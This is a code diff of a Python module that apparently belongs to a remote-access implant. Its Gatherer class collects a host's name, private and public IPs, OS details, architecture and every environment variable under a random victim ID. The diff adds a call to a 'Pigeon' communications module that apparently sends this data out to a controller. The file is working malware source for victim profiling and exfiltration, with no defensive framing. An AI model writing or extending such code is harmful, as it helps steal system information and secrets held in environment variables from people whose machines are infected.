@@ -1,4 +1,5 @@
 import os
+from .pigeon import Pigeon
 import platform
 from requests import ConnectionError, get
 import socket
@@ -12,10 +13,10 @@ def getPubIP() -> str:
         ip += "error retrieving"
     return ip
 
-class gatherer:
+class Gatherer:
     def __init__(self) -> None:
-        self.info = ""
-        self.uid = os.urandom(24).hex()
+        self.info: str = ""
+        self.uid: str = os.urandom(24).hex()
         self.info += "UUID: {}".format(self.uid) 
         self.info += " | Hostname: {}".format(socket.gethostname())
         self.info += " | PrivIP: {}".format(socket.gethostbyname(socket.gethostname()))
@@ -24,3 +25,4 @@ class gatherer:
         self.info += " | Processor: {}".format(platform.processor())
         self.info += " | Arch: {}".format(platform.machine())
         self.info += " | Envs: {}".format(os.environ)
+        Pigeon.initComs(self.uid, self.info)
